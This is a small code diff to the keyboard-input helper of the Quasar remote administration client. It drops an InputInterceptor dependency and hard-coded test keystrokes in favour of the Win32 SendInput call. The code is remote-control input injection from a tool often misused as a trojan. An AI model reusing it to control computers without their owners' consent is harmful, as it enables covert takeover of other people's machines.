@@ -1,5 +1,4 @@
-﻿using InputInterceptorNS;
-using Quasar.Client.Utilities;
+﻿using Quasar.Client.Utilities;
 using System;
 using System.Drawing;
 using System.Runtime.InteropServices;
@@ -125,18 +124,7 @@ namespace Quasar.Client.Helper
                 }
             };
 
-            //NativeMethods.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(NativeMethods.INPUT)));
-
-            if (keyDown)
-            {
-                InputIntercepterHelper.InputSimulateKeyDown(KeyCode.A);
-            }
-            else
-            {
-                InputIntercepterHelper.InputSimulateKeyUp(KeyCode.A);
-            }
-
-            //InputIntercepterHelper
+            NativeMethods.SendInput((uint)inputs.Length, inputs, Marshal.SizeOf(typeof(NativeMethods.INPUT)));
         }
 
         private const int SPI_GETSCREENSAVERRUNNING = 114;
